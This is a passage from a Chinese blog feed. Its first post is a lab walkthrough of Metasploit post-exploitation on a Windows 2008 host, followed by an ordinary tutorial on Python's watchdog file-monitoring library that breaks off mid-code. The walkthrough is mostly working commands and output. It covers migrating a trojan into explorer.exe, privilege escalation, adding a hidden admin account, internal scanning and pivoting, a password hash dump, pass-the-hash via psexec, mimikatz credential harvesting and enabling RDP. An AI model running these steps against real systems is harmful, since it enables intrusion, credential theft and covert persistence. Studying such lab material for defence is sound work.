<h1 id="四、迁移-注入进程"><a href="#四、迁移-注入进程" class="headerlink" title="四、迁移/注入进程"></a>四、迁移/注入进程</h1><p>我们的木马w01ke.exe如果我们退出了shell会话或者对方关机，我们都会丢失对目标主机Win2008的控制，我们可以将进程注入到目标主机Win2008的常用进程，这样每次目标主机Win2008启动了被注入的服务进程，我们的木马也会上线</p>
<p>这里我们选择注入到explorer.exe，通过上面的信息收集可以知道进程explorer.exe的PID为1560，w01ke.exe的PID为2016</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1651916827421-8acd5d37-e734-4adf-9e2a-751ba0c8caf3.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1651916935587-9698d22b-d276-410f-a86d-727427b670b9.png" alt="img"></p>
<p>使用以下命令进行迁移</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter&gt; migrate 1560</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1651917042660-2e0f5e46-0f87-4ddc-8ae3-0fd15021fbd1.png" alt="img"></p>
<p>此时再次查看目标主机进程，已经没有w01ke.exe了</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1651917136469-6e85ad86-0890-46a9-97af-9557abe20ceb.png" alt="img"></p>
<h1 id="五、提权"><a href="#五、提权" class="headerlink" title="五、提权"></a>五、提权</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter&gt; getuid      查看当前用户</span><br><span class="line">meterpreter&gt; getprivs    尽可能提升权限</span><br><span class="line">meterpreter&gt; getsystem   通过各种攻击向量来提升系统用户权限</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1651917693380-d772d5dd-90ea-41a5-ac3e-c82471709cbe.png" alt="img"></p>
<h1 id="六、持久后门：添加隐藏用户"><a href="#六、持久后门：添加隐藏用户" class="headerlink" title="六、持久后门：添加隐藏用户"></a>六、持久后门：添加隐藏用户</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; shell </span><br><span class="line">C:\Windows\system32&gt;net user <span class="built_in">test</span>$ 123456 /add &amp; net localgroup administrators <span class="built_in">test</span>$ /add</span><br></pre></td></tr></table></figure>

<h1 id="七、扫描内网存活主机"><a href="#七、扫描内网存活主机" class="headerlink" title="七、扫描内网存活主机"></a>七、扫描内网存活主机</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter&gt; info post/multi/gather/ping_sweep</span><br><span class="line">meterpreter&gt; run post/multi/gather/ping_sweep rhosts=10.10.10.1-10.10.10.5</span><br><span class="line">meterpreter&gt; run post/multi/gather/ping_sweep rhosts=10.10.10.0/24</span><br><span class="line"></span><br><span class="line">这个模块会尝试ping内网的主机，如果有回包，说明该主机存活</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1651919759467-d735f2af-a6c0-4231-9e9b-fa6a19254d13.png" alt="img"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter&gt; info post/windows/gather/arp_scanner</span><br><span class="line">meterpreter&gt; run post/windows/gather/arp_scanner rhosts=10.10.10.1-10.10.10.5</span><br><span class="line">meterpreter&gt; run post/windows/gather/arp_scanner rhosts=10.10.10.0/24</span><br><span class="line"></span><br><span class="line">这个模块会尝试发送arp包，如果有回包，说明该主机存活</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1651920127378-89a28d5d-3af0-4627-a3c1-866072fb0687.png" alt="img"></p>
<h1 id="八、添加内网路由"><a href="#八、添加内网路由" class="headerlink" title="八、添加内网路由"></a>八、添加内网路由</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter&gt; run autoroute -s 10.10.10.0/24</span><br><span class="line">meterpreter&gt; run autoroute -p</span><br><span class="line">或者</span><br><span class="line">meterpreter&gt; run post/multi/manage/autoroute</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1651920447825-b36b7cc1-4689-46b3-9608-a6049b6a46a2.png" alt="img"></p>
<h1 id="九、扫描内网主机开放的端口"><a href="#九、扫描内网主机开放的端口" class="headerlink" title="九、扫描内网主机开放的端口"></a>九、扫描内网主机开放的端口</h1><p>通过MSF SOCKS代理模块，用nmap扫描内网主机开放的端口</p>
<h3 id="（1）配置SOCKS代理"><a href="#（1）配置SOCKS代理" class="headerlink" title="（1）配置SOCKS代理"></a>（1）配置SOCKS代理</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter&gt; background</span><br><span class="line">msf6 exploit(multi/handler) &gt; use auxiliary/server/socks_proxy</span><br><span class="line">msf6 auxiliary(server/socks_proxy) &gt; <span class="built_in">set</span> srvhost 192.168.1.8(Win2008的IP)</span><br><span class="line">msf6 auxiliary(server/socks_proxy) &gt; exploit -j</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1651924617653-7391d8bc-a996-4a5c-8ba0-9b0bea4f40c6.png" alt="img"></p>
<p>修改proxychains配置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/proxychains4.conf</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1651924531555-658d3a31-966c-450b-8c21-894e7aa1dff3.png" alt="img"></p>
<h3 id="（2）使用nmap进行扫描"><a href="#（2）使用nmap进行扫描" class="headerlink" title="（2）使用nmap进行扫描"></a>（2）使用nmap进行扫描</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains nmap -sT -Pn -sV -p 22,80,445,3306 	10.10.10.128-129 --open -oN 10.10.10.0.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1651924670402-375bf01e-d089-44df-96e3-60cf9ab548a2.png" alt="img"></p>
<p>看到数据服务器10.10.10.128开启了445端口，那么就可以考虑Hash传递攻击（直接使用密文登录）</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1651924899851-7b3f0d9f-2da8-4db7-a088-649619d5fe4a.png" alt="img"></p>
<h1 id="十、攻击内网主机"><a href="#十、攻击内网主机" class="headerlink" title="十、攻击内网主机"></a>十、攻击内网主机</h1><p>看到数据服务器10.10.10.128开启了445端口，那么就可以考虑Hash传递攻击（直接使用密文登录）</p>
<h3 id="（1）提取Win2008的密码Hash"><a href="#（1）提取Win2008的密码Hash" class="headerlink" title="（1）提取Win2008的密码Hash"></a>（1）提取Win2008的密码Hash</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter&gt; hashdump</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:afffeba176210fad4628f0524bfe1942:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure>

<p>以aad3b435开头的哈希值是一个空的或不存在的哈希值（空字串的占位符）</p>
<p>windows系统存储哈希值的方式一般为LAN Manager（LM）、NT LAN Manager（NTLM），或NT LAN Manager v2（NTLMv2）。</p>
<p>在LM存储方式中，当用户首次输入密码或更改密码的时候，密码被转换为哈希值，由于哈希长度的限制，将密码切分为7个字符一组的哈希值。以password123456的密码为例，哈希值以passwor和d123456的方式存储，所以攻击者只需要简单地破解7个字符一组的密码，而不是原始的4个字符。而NTLM的存储方式跟密码长度无关，密码password123456将作为整体转换为哈希值存储。</p>
<p>而上面aad3b435b51404eeaad3b435b51404ee是LM哈希，afffeba176210fad4628f0524bfe1942是NTLM哈希</p>
<h3 id="（2）配置SMB攻击模块，传递哈希"><a href="#（2）配置SMB攻击模块，传递哈希" class="headerlink" title="（2）配置SMB攻击模块，传递哈希"></a>（2）配置SMB攻击模块，传递哈希</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 auxiliary(server/socks_proxy) &gt; use exploit/windows/smb/psexec</span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt; <span class="built_in">set</span> payload windows/meterpreter/bind_tcp</span><br><span class="line">这里不能用reverse_tcp了因为这是内网环境了没办法弹回我们外网的kali来（除非做了隧道），因此我们使用正向连接</span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt; <span class="built_in">set</span> rhosts 10.10.10.128</span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt; <span class="built_in">set</span> smbuser Administrator</span><br><span class="line">这里的smbuser设置为Administrator是因为上一步获取<span class="built_in">hash</span>时得到了Administrator</span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt; <span class="built_in">set</span> smbpass aad3b435b51404eeaad3b435b51404ee:afffeba176210fad4628f0524bfe1942</span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt; exploit</span><br></pre></td></tr></table></figure>

<p>由于数据服务器Win7的Administrator账户已被禁用，因此报错了</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1651927346869-d0e46595-7fa0-4ac0-94e8-019a83580ed7.png" alt="img"></p>
<p>为了实验顺利进行，取消禁用</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1651928646370-633717c4-cecf-4f01-9208-bd03113f89ea.png" alt="img"></p>
<p>再次exploit，成功控制数据服务器Win7</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1651928788311-aa68e611-b376-4f0a-a378-a03571c79c77.png" alt="img"></p>
<h3 id="（3）利用-kiwi-mimikatz-进行信息收集"><a href="#（3）利用-kiwi-mimikatz-进行信息收集" class="headerlink" title="（3）利用 kiwi(mimikatz) 进行信息收集"></a>（3）利用 kiwi(mimikatz) 进行信息收集</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; load kiwi</span><br><span class="line">Kiwi Commands</span><br><span class="line">=============</span><br><span class="line"></span><br><span class="line">Command                Description</span><br><span class="line">-------                -----------</span><br><span class="line">creds_all              Retrieve all credentials (parsed)</span><br><span class="line">creds_kerberos         Retrieve Kerberos creds (parsed)</span><br><span class="line">creds_livessp          Retrieve Live SSP creds</span><br><span class="line">creds_msv              Retrieve LM/NTLM creds (parsed)</span><br><span class="line">creds_ssp              Retrieve SSP creds</span><br><span class="line">creds_tspkg            Retrieve TsPkg creds (parsed)</span><br><span class="line">creds_wdigest          Retrieve WDigest creds (parsed)</span><br><span class="line">dcsync                 Retrieve user account information via DCSync (unparsed)</span><br><span class="line">dcsync_ntlm            Retrieve user account NTLM <span class="built_in">hash</span>, SID and RID via DCSync</span><br><span class="line">golden_ticket_create   Create a golden kerberos ticket</span><br><span class="line">kerberos_ticket_list   List all kerberos tickets (unparsed)</span><br><span class="line">kerberos_ticket_purge  Purge any in-use kerberos tickets</span><br><span class="line">kerberos_ticket_use    Use a kerberos ticket</span><br><span class="line">kiwi_cmd               Execute an arbitary mimikatz <span class="built_in">command</span> (unparsed)</span><br><span class="line">lsa_dump_sam           Dump LSA SAM (unparsed) 查看目标系统的 SAMdump：</span><br><span class="line">lsa_dump_secrets       Dump LSA secrets (unparsed) 查看目标系统的密码</span><br><span class="line">password_change        Change the password/<span class="built_in">hash</span> of a user</span><br><span class="line">wifi_list              List wifi profiles/creds <span class="keyword">for</span> the current user</span><br><span class="line">wifi_list_shared       List shared wifi profiles/creds (requires SYSTEM)</span><br></pre></td></tr></table></figure>

<p>可以看到明文密码123456（如果没有明文可以尝试暴力破解）</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1651929685003-ab192554-194a-455f-8e81-e550fdceded2.png" alt="img"></p>
<h3 id="（4）开启远程桌面"><a href="#（4）开启远程桌面" class="headerlink" title="（4）开启远程桌面"></a>（4）开启远程桌面</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Usage: run getgui -u &lt;username&gt; -p &lt;password&gt;</span><br><span class="line">Or:    run getgui -e</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line"></span><br><span class="line">    -e        Enable RDP only.</span><br><span class="line">    -f &lt;opt&gt;  Forward RDP Connection.</span><br><span class="line">    -h        Help menu.</span><br><span class="line">    -p &lt;opt&gt;  The Password of the user to add.</span><br><span class="line">    -u &lt;opt&gt;  The Username of the user to add.</span><br></pre></td></tr></table></figure>

<p>开启远程桌面服务</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1651929900576-e40e4f98-a4ee-45f0-a0ad-8a8d4726e3ea.png" alt="img"></p>
<h3 id="（5）远程连接"><a href="#（5）远程连接" class="headerlink" title="（5）远程连接"></a>（5）远程连接</h3><h4 id="①-使用之前部署好的proxychains"><a href="#①-使用之前部署好的proxychains" class="headerlink" title="① 使用之前部署好的proxychains"></a>① 使用之前部署好的proxychains</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains rdesktop -u Administrator -p 123.com 10.10.10.128:3389</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1651930149535-fa3aff5e-20f0-4dac-b07d-df494453dcd0.png" alt="img"></p>
<h4 id="②-使用端口转发"><a href="#②-使用端口转发" class="headerlink" title="② 使用端口转发"></a>② 使用端口转发</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; portfwd add -l 13389 -p 3389 -r 10.10.10.128</span><br><span class="line">rdesktop -u Administrator -p 123.com 127.0.0.1:13389</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1651930460989-7d30fe65-9533-42bd-b839-2857cc42cae5.png" alt="img"></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title>使用Watchdog监控文件</title>
    <url>/post/8501a278.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>好久没有更新了，最近刚到家，调整了下状态继续学习更新</p>
<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>Watchdog是一款用于监控文件系统事件的Python库，对不同平台的事件进行了封装。</p>
<p>Watchdog优先使用底层原生API，其次再通过轮询磁盘实现监控，目前支持以下操作系统</p>
<ul>
<li><p>Windows：<a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-readdirectorychangesw?redirectedfrom=MSDN">ReadDirectoryChangesW</a></p>
</li>
<li><p>Linux 2.6+：<a href="https://linux.die.net/man/7/inotify">inotify</a></p>
</li>
<li><p>Mac OS X：<a href="https://www.freebsd.org/cgi/man.cgi?query=kqueue&sektion=2">kqueue</a> 或 <a href="https://developer.apple.com/library/archive/documentation/Darwin/Conceptual/FSEvents_ProgGuide/Introduction/Introduction.html">FSEvents</a></p>
</li>
<li><p>BSD Unix variants：<a href="https://www.freebsd.org/cgi/man.cgi?query=kqueue&sektion=2">kqueue</a></p>
</li>
</ul>
<p>仅支持Python 3.5+</p>
<h1 id="二、安装WatchDog"><a href="#二、安装WatchDog" class="headerlink" title="二、安装WatchDog"></a>二、安装WatchDog</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install watchdog</span><br></pre></td></tr></table></figure>

<h1 id="三、初试"><a href="#三、初试" class="headerlink" title="三、初试"></a>三、初试</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> watchdog.observers <span class="keyword">import</span> Observer</span><br><span class="line"><span class="keyword">from</span> watchdog.events <span class="keyword">import</span> FileSystemEventHandler</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyHandler</span>(<span class="params">FileSystemEventHandler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">on_any_event</span>(<span class="params">self, event</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(event.event_type, event.src_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">event_handler = MyHandler()</span><br><span class="line">observer = Observer()</span><br><span class="line">observer.schedule(event_handler, path=<span class="string">&#x27;.&#x27;</span>, recursive=<span class="literal">False</span>)</span><br><span class="line">observer.start()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    observer.stop()</span><br><span class="line">observer.join()</span><br></pre></td></tr></table></figure>

<p>效果：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">created .\a.txt</span><br><span class="line">modified .\a.txt~</span><br><span class="line">modified .\a.txt</span><br><span class="line">moved .\a.txt</span><br><span class="line">deleted .\b.txt</span><br></pre></td></tr></table></figure>

<p>退出：Ctrl + C</p>
<h1 id="四、重定向到日志中"><a href="#四、重定向到日志中" class="headerlink" title="四、重定向到日志中"></a>四、重定向到日志中</h1><p>输出重定向到logging日志中</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">from</span> watchdog.observers <span class="keyword">import</span> Observer</span><br><span class="line"><span class="keyword">from</span> watchdog.events <span class="keyword">import</span> LoggingEventHandler</span><br><span class="line"></span><br><span class="line">logging.basicConfig(level=logging.INFO,</span><br><span class="line">                    <span class="built_in">format</span>=<span class="string">&#x27;%(asctime)s - %(message)s&#x27;</span>,</span><br><span class="line">                    datefmt=<span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>)</span><br><span class="line">path = sys.argv[<span class="number">1</span>] <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span> <span class="keyword">else</span> <span class="string">r&#x27;D:\监控文件夹&#x27;</span></span><br><span class="line">event_handler = LoggingEventHandler()</span><br><span class="line">observer = Observer()</span><br><span class="line">observer.schedule(event_handler, path, recursive=<span class="literal">True</span>)</span><br><span class="line">observer.start()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    observer.stop()</span><br><span class="line">    observer.join()</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1641730099621-6c822635-8525-47a0-86bf-59c8ee5ad985.png" alt="img"></p>
<h1 id="五、Handler类型"><a href="#五、Handler类型" class="headerlink" title="五、Handler类型"></a>五、Handler类型</h1><table>
<thead>
<tr>
<th><strong>类型</strong></th>
<th><strong>功能</strong></th>
</tr>
</thead>
<tbody><tr>
<td>FileSystemEventHandler</td>
<td>文件</td>
</tr>
<tr>
<td>PatternMatchingEventHandle</td>
<td>模式匹配文件</td>
</tr>
<tr>
<td>RegexMatchingEventHandler</td>
<td>正则匹配文件</td>
</tr>
<tr>
<td>LoggingEventHandler</td>
<td>记录日志</td>
</tr>
</tbody></table>
<h1 id="六-、WatchDog相关介绍"><a href="#六-、WatchDog相关介绍" class="headerlink" title="六 、WatchDog相关介绍"></a>六 、WatchDog相关介绍</h1><h2 id="1、Observer"><a href="#1、Observer" class="headerlink" title="1、Observer"></a>1、Observer</h2><p>可以通过以下命令导入</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> watchdog.observers <span class="keyword">import</span> Observer</span><br></pre></td></tr></table></figure>

<p>这个模块的作用主要是当作启动和关闭监控程序的，给予文件夹路径后，Observer会监控文件夹的变化并且反馈变化。</p>
<h2 id="2、events"><a href="#2、events" class="headerlink" title="2、events"></a>2、events</h2><p>可以通过以下命令导入</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> watchdog.events <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;这是watchdog的动作模块，具体作用是根据Observer模块反馈的事件分配不一样的操作动作方法，然后程序再继承这个方法开始执行所需的代码。有的萌新会问，为什么Observer反馈了事件还需要events去接收处理，还得再去继承events多麻烦。具体为啥我也不知道，只是官方把Observer事件反馈的结果传给events，events进行分配的。觉得麻烦的大哥可以自己写模块接受Observer结果并处理，萌新的我选择直接继承官方events实列，反正效果差不多。</p>
<h1 id="七、自定义操作动作"><a href="#七、自定义操作动作" class="headerlink" title="七、自定义操作动作"></a>七、自定义操作动作</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> watchdog.observers <span class="keyword">import</span> Observer</span><br><span class="line"><span class="keyword">from</span> watchdog.events <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a = <span class="string">r&quot;D:\监控文件夹&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyHandler</span>(<span class="params">FileSystemEventHandler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">on_modified</span>(<span class="params">self, event</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;文件被修改了 %s &quot;</span> % event.src_path)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">on_created</span>(<span class="params">self, event</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;文件被创建了 %s&quot;</span> % event.src_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    path = a</span><br><span class="line">    event_handler = MyHandler()</span><br><span class="line">    observer = Observer()</span><br><span class="line">    observer.schedule(event_handler, path, recursive=<span class="literal">True</span>)</span><br><span class="line">    observer.start()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        observer.stop()</span><br><span class="line">    observer.join()</span><br></pre></td></tr></table></figure>

<p>在监控目录下进行新建文件夹和删除文件夹操作结果：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1641656163412-da869f38-bdfb-4276-bbd3-2722766fcf4e.png" alt="img"></p>
<p>有没有仔细看我对events模块导入的是 所有的类？实际上使用的主要是：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">FileSystemEventHandler这个类</span><br></pre></td></tr></table></figure>

<p>点开events模块：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1641656577749-ea3c0272-c606-4e5d-8278-9752c395af73.png" alt="img"></p>
<p>类有很多个，简单用不到其他类的可以只导入这一个就行了 ，这个类官方是咋写的呢？看下图：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1641656646230-74ba4802-a9eb-429d-889a-f52e878b3a4a.png" alt="img"></p>
<p>&emsp;&emsp;你会发现除了 dispatch 下面有内容，这个类的其他方法都是空的</p>
<p>&emsp;&emsp;这里dispatch决定了接收到Observer动作后转发给哪个方法操作，而on_any_event 呢会首先被dispatch调用，之后才会分配给其他的方法。这里的所有方法都是空的，目的就是让我们自行继承这个类然后执行我们自己的代码。由于已经把动作分配好了，比如我新建文件夹，只会调用create，或者移动文件夹只会调用move，所以根据相关动作继承该方法后在方法里面写需要执行的代码即可实现监控和监控操作。</p>
<h1 id="八、课程设计相关"><a href="#八、课程设计相关" class="headerlink" title="八、课程设计相关"></a>八、课程设计相关</h1><p>&emsp;&emsp;前几天网络安全课程设计，有个选题就是关于文件监控相关的，在这里我把我的课程设计报告贴出来</p>
<h2 id="1、课程设计目的"><a href="#1、课程设计目的" class="headerlink" title="1、课程设计目的"></a>1、课程设计目的</h2><p>&emsp;&emsp;本课程设计要求学生在已有理论学习的基础上，全面梳理所学的计算机网络、网络安全、程序设计等相关知识，进一步深入理解网络安全的内容；了解常见的网络安全工具、资源和相关技术，掌握网络安全应用系统分析、设计、实现和测试的方法。</p>
<h2 id="2、系统需求分析"><a href="#2、系统需求分析" class="headerlink" title="2、系统需求分析"></a>2、系统需求分析</h2><p>（1）提高安全性。随着计算机技术的发展和计算机的广泛应用，对计算机的安全的要求也越来越高。一个主要的问题是保证磁盘中的数据的安全，并能实时地发现其中的异常运行状况，从而及时地进行系统的改进和维护，这需要实时的监控计算机在进行文件操作的时候产生的各种信息和数据。文件系统的监控是保护磁盘数据安全的一种强大的方式，通过在文件系统之上增加一层文件监控系统，为系统安全提供了日志信息以供分析，有着重要的理论和实践意义.</p>
<p>（2）记录行为轨迹。记录机器使用者的文件操作，分析使用者的行为轨迹和逻辑。</p>
<p>（3）行为分析。当需要对一个恶意程序进行代码分析时，可以尝试在沙箱运行恶意代码，从捕捉到恶意代码运行时的文件操作来逆向推出恶意代码的逻辑，以制作出补丁反制。</p>
<p>（4）快速响应。服务器的后台程序通常在机器没有问题的情况下，需要长期运行（比如说数个月，甚至是数年）。但是，程序的配置文件有时候是需要定期作调整。为了不影响程序对外服务（不重启），动态加载配置文件是一种非常常见的需求。通过监控某个文件的创建、删除和修改等事件，可以很方便做出对应的动作（比如说reload）。</p>
<h2 id="3、代码"><a href="#3、代码" class="headerlink" title="3、代码"></a>3、代码</h2><p>Github项目地址：<a href="https://github.com/w01ke/File-monitoring">https://github.com/w01ke/File-monitoring</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> watchdog.observers <span class="keyword">import</span> Observer</span><br><span class="line"><span class="keyword">from</span> watchdog.events <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> openpyxl</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyHandler</span>(<span class="params">FileSystemEventHandler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.time = <span class="number">1</span></span><br><span class="line">        self.file = <span class="number">2</span></span><br><span class="line">        self.action = <span class="number">3</span></span><br><span class="line">        self.rows = <span class="number">2</span></span><br><span class="line">        self.num = <span class="number">0</span>; </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">on_modified</span>(<span class="params">self, event</span>):</span></span><br><span class="line">        action_time = time.strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>, time.localtime())</span><br><span class="line">        action = <span class="string">&quot;修改&quot;</span></span><br><span class="line">        modified_log = action_time + <span class="string">&#x27; &#x27;</span> + action + event.src_path</span><br><span class="line">        <span class="built_in">print</span>(modified_log)</span><br><span class="line">        ws.cell(row=self.rows, column=<span class="number">1</span>).value = action_time</span><br><span class="line">        ws.cell(row=self.rows, column=<span class="number">2</span>).value = action</span><br><span class="line">        ws.cell(row=self.rows, column=<span class="number">3</span>).value = event.src_path</span><br><span class="line">        self.rows += <span class="number">1</span></span><br><span class="line">        wb.save(filename)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">on_created</span>(<span class="params">self, event</span>):</span></span><br><span class="line">        action_time = time.strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>, time.localtime())</span><br><span class="line">        action = <span class="string">&quot;创建&quot;</span></span><br><span class="line">        created_log = action_time + <span class="string">&#x27; &#x27;</span> + action + event.src_path</span><br><span class="line">        <span class="built_in">print</span>(created_log)</span><br><span class="line">        ws.cell(row=self.rows, column=<span class="number">1</span>).value = action_time</span><br><span class="line">        ws.cell(row=self.rows, column=<span class="number">2</span>).value = action</span><br><span class="line">        ws.cell(row=self.rows, column=<span class="number">3</span>).value = event.src_path</span><br><span class="line">        self.rows += <span class="number">1</span></span><br><span class="line">        wb.save(filename)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">on_moved</span>(<span class="params">self, event</span>):</span></span><br><span class="line">        action_time = time.strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>, time.localtime())</span><br><span class="line">        action = <span class="string">&quot;移动&quot;</span></span><br><span class="line">        moved_log = action_time + <span class="string">&#x27; &#x27;</span> + action + event.src_path</span><br><span class="line">        <span class="built_in">print</span>(moved_log)</span><br><span class="line">        ws.cell(row=self.rows, column=<span class="number">1</span>).value = action_time</span><br><span class="line">        ws.cell(row=self.rows, column=<span class="number">2</span>).value = action</span><br><span class="line">        ws.cell(row=self.rows, column=<span class="number">3</span>).value = event.src_path</span><br><span class="line">        self.rows += <span class="number">1</span></span><br><span class="line">        wb.save(filename)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">on_deleted</span>(<span class="params">self, event</span>):</span></span><br><span class="line">        action_time = time.strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>, time.localtime())</span><br><span class="line">        action = <span class="string">&quot;删除&quot;</span></span><br><span class="line">        deleted_log 